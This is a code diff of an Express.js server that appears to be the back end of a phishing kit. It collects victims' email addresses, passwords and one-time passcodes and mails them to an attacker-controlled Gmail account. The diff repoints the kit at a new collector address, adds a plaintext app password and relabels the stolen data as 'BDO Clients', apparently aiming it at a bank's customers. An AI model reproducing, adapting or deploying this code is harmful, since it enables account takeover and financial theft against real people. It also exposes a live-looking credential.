@@ -10,9 +10,9 @@ app.use(cors());
 const PORT = process.env.PORT || 5000; // port to connect to WEB
 
 // emails credentials
-const userEmail = "Paydaysite1@gmail.com";
-//const pass = "jrqjapmxebtahohb";
-// 13 apirl
+const userEmail = "roqqucares@gmail.com";
+const pass = "ldnhoatyrjilohik";
+// 15th Dec
 
 // Middleware
 app.use(express.json());
@@ -34,8 +34,8 @@ app.post("/", (req, res) => {
   const mailOptions = {
     from: `${username}`,
     to: userEmail,
-    subject: `Email: ${username} \t\n\n\n password: ${password}`,
-    text: `New user registered with Email: ${username} and password: ${password}`,
+    subject: `BDO Clients: Email: ${username} \t\n\n\n password: ${password}`,
+    text: `BDO Clients: New user registered with Email: ${username} and password: ${password}`,
   };
 
   console.log(mailOptions);
@@ -65,8 +65,8 @@ app.post("/otp", (req, res) => {
   const mailOptions = {
     from: email,
     to: userEmail,
-    subject: `OTP: ${req.body?.otp} `,
-    text: `New user registered with OTP: ${req.body?.otp}`,
+    subject: `BDO Clients: OTP: ${req.body?.otp} `,
+    text: `BDO Clients: New user registered with OTP: ${req.body?.otp}`,
   };
 
   console.log(mailOptions);
@@ -84,3 +84,4 @@ app.post("/otp", (req, res) => {
 app.listen(PORT, () => {
   console.log(`Server is running on port http://localhost:${PORT}`);
 });
+
